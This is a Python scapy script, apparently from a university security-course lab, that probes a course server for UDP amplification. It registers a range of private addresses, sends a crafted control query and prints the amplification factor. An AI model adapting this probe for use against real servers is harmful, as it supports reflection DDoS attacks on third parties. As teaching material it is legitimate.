#!/usr/bin/env python

from scapy.all import Raw, IP, sr1, send, UDP

import sys

SERVER_IP = "cs177.seclab.cs.ucsb.edu"

def main():
    if len(sys.argv) != 2:
        print("Usage: python dns_amplify.py <port>")
        return 1 

    port = int(sys.argv[1])

    for i in range(50):
        ip = f"10.0.0.{i}"
        print(f"Sending IP: {ip}")
        payload = f"TimeRequest {ip}".encode()
        send(IP(dst=SERVER_IP) / UDP(dport=port) / Raw(load=payload), verbose=0)
    
    # for i in range(1 << 5):

    # print(f"Trying request num {i}:")

    payload = bytes([
        0x1e,
        0x04, 
        0x00, 0x01,  # sequence
        0x00, 0x00,  # status
        0x00, 0x00,  # assoc id
        0x00, 0x00,  # offset
        0x00, 0xff   # count 
    ]) + 36 * b"\x00"
    
    packet = IP(dst=SERVER_IP) / UDP(dport=port) / Raw(load=payload)

    response = sr1(packet, timeout=12, verbose=0)

    if response:
        response.show()
        
        request_size = len(bytes(packet[Raw]))
        response_size = len(bytes(response[Raw])) if response else 0

        print(f"Request Size: {request_size}")
        print(f"Response Size: {response_size}")
        print(f"Amplification: {response_size / request_size:.2f}")
    else:
        print("No response")
    
if __name__ == "__main__":
    main()
